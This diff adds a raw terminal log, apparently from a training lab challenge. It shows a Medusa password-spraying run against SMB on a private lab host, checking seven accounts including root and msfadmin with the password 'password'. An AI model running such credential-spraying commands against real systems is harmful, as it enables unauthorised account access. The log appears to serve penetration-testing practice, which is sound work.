@@ -1,0 +1,11 @@
+$ medusa -h 192.168.56.101 -U /home/kali/desafio/wordlists/users-enum.txt -P /home/kali/desafio/wordlists/spray.txt -M smbnt -t 3
+
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2026-11-20 02:31:17 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (2 of 7, 2 complete) Password: password (1 of 1 complete)
+2026-11-20 02:31:17 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: postgres (3 of 7, 3 complete) Password: password (1 of 1 complete)
+2026-11-20 02:31:17 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (1 of 7, 4 complete) Password: password (1 of 1 complete)
+2026-11-20 02:31:17 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (4 of 7, 5 complete) Password: password (1 of 1 complete)
+2026-11-20 02:31:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: sys (5 of 7, 6 complete) Password: password (1 of 1 complete)
+2026-11-20 02:31:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: backup (6 of 7, 7 complete) Password: password (1 of 1 complete)
+2026-11-20 02:31:18 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (7 of 7, 7 complete) Password: password (1 of 1 complete)
